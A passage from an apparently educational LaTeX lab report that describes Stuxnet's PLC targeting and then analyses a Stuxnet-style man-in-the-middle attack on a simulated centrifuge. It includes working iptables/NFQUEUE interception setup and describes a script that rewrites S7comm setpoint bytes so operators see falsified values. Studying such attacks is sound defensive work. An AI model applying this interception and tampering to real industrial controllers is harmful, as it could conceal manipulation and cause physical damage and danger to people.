However, what is sophisticated here is that Stuxnet selects targets very carefully. If a target does not meet the requirements, Stuxnet goes dormant to reduce its presence. It only attacks PLCs controlling drives with the following characteristics:


\begin{itemize}
    \item Siemens S7-300 series
\end{itemize}


\begin{itemize}
    \item Drive manufacturer is Vacon (Finland) or Fararo Paya (Iran)
\end{itemize}


\begin{itemize}
    \item Operating frequency in the range \textbf{807} Hz to \textbf{1210} Hz. This rotation speed is much higher than that of most industrial machines, except gas centrifuges.
\end{itemize}


When conditions are met, Stuxnet changes the output frequency in short stages to disrupt system operation, with commonly cited levels of 1410 Hz, 2 Hz, and 1064 Hz. In this way, it changes the centrifuge rotation speed and can cause physical damage while monitoring data remains concealed.


Stuxnet was not widely discovered until 2010, when its third version had already spread worldwide. A Belarusian cybersecurity company found it on a computer in Iran. Security researchers then analyzed it and identified Stuxnet as part of a sophisticated cyber campaign targeting Iran's nuclear program.

\subsubsection{Attack analysis}


The hardest part of this attack is modifying packets and then forwarding them again. To maintain speed, ARP spoofing with Bettercap is used here to redirect packets to the attacker machine. There, packets are pushed into NFQUEUE so a Python application can process them instead of letting the OS kernel forward them automatically.


\textit{One reason is that Bettercap only supports packet editing when intercepting via JavaScript, which is not suitable for implementing an S7 parser, so this approach was required}


\begin{packetdump}
# 1. Enable IP forwarding
subprocess.run("sysctl -w net.ipv4.ip_forward=1 > /dev/null", shell=True)

# 2. Disable RP filter (avoid dropping return packets from the router)
# Prevent the kernel from automatically dropping unexpected packets -> allow packets from the PLC to pass through
subprocess.run("sysctl -w net.ipv4.conf.all.rp_filter=0 > /dev/null", shell=True)
subprocess.run("sysctl -w net.ipv4.conf.default.rp_filter=0 > /dev/null", shell=True)
subprocess.run(f"sysctl -w net.ipv4.conf.{INTERFACE}.rp_filter=0 > /dev/null", shell=True)

# 3. Add a route to the PLC subnet via the real gateway
# Without this line, the HMI loses connectivity immediately when it sends a read-var request to the PLC
print(f"[*] Adding route to {PLC_NET} via {GATEWAY}...")
subprocess.run(f"route add -net {PLC_NET} gw {GATEWAY} 2>/dev/null", shell=True)

# 4. Configure iptables
print("[*] Setting up iptables NFQUEUE...")
subprocess.run("iptables -F", shell=True)               # Clear the filter table
subprocess.run("iptables -t mangle -F", shell=True)      # Clear the mangle table
subprocess.run("iptables -P FORWARD ACCEPT", shell=True) # Ensure forwarding is not blocked

# Trap S7 traffic (port 102) into the queue
# Instead of the kernel dropping packets automatically, the Python app processes and forwards them
subprocess.run(f"iptables -t mangle -A FORWARD -p tcp --dport 102 -j NFQUEUE --queue-num {QUEUE_NUM}", shell=True)
subprocess.run(f"iptables -t mangle -A FORWARD -p tcp --sport 102 -j NFQUEUE --queue-num {QUEUE_NUM}", shell=True)

# Block RST packets generated by the kernel (avoid disconnection)
# The kernel sends RST (reset connection) if it receives a packet on a port it does not recognize
subprocess.run("iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP", shell=True)
\end{packetdump}

\begin{itemize}
    \item \texttt{Variable Type}: Defines the data type and length of the variable (typically S7 types such as REAL, BIT, BYTE, WORD, DWORD, COUNTER, \ldots).
    \item \texttt{Count}: An entire array of variables of the same type can be selected using a single struct item. These variables must share the same type, be contiguous in memory, and the \texttt{Count} field defines the size of this array. It is set to 1 when reading or writing a single variable.
    \item The remaining fields identify the read/write address according to the Any-type structure, with \texttt{DB Number} (present only when \texttt{area} is DB) for the datablock to read, \texttt{Area} for the memory area (DB, M, I, Q), and \texttt{Address} for the specific address within that area. This 3-byte \texttt{Address} field encodes the bit offset in big-endian form.
\end{itemize}

The role of \texttt{s7\_intercept.py} (\url{./attacker/mitm/s7_intercept.py}) is as follows:

\begin{enumerate}
    \item Retrieve S7 packets from NFQUEUE; each packet is passed to the \texttt{process\_packet} function for processing.

    \item The \texttt{process\_packet} function checks whether the packet is an S7comm packet by verifying sequentially:
    \begin{itemize}
        \item TPKT byte: \texttt{payload[0] == 0x03};
        \item COTP: \texttt{payload[4] == 0x02};
        \item S7 header: \texttt{payload[7] == 0x32};
        \item ROSCTR: \texttt{payload[8] == 0x03} (i.e.\ a response packet from the PLC to the HMI).
    \end{itemize}

    \item If the packet is S7comm and is a response from the PLC to the HMI, two cases arise (corresponding to the two request--response pairs mentioned earlier):
    \begin{itemize}
        \item A response to the command that reads 1 bit \texttt{bCentrifugeStatus} at \texttt{DB2.DBX0.0};
        \item A response to the 4-byte read of \texttt{iSetpoint} and \texttt{iSimSpeed} at \texttt{DB1.DBW2}.
    \end{itemize}

    Filtering is applied so that only the response returning \texttt{iSetpoint} and \texttt{iSimSpeed} is modified.
    This packet is 29 bytes long, longer than the response returning \texttt{bCentrifugeStatus}.
    Because the DB1 datablock layout places \texttt{iSetpoint} after \texttt{iSimSpeed}, its value lies at offsets 27 and 28.
    Overwriting these two bytes with the new value completes the modification.

    \item Clear checksums so that Scapy recalculates them.

    \item Push the packet back to NFQUEUE for forwarding.
\end{enumerate}
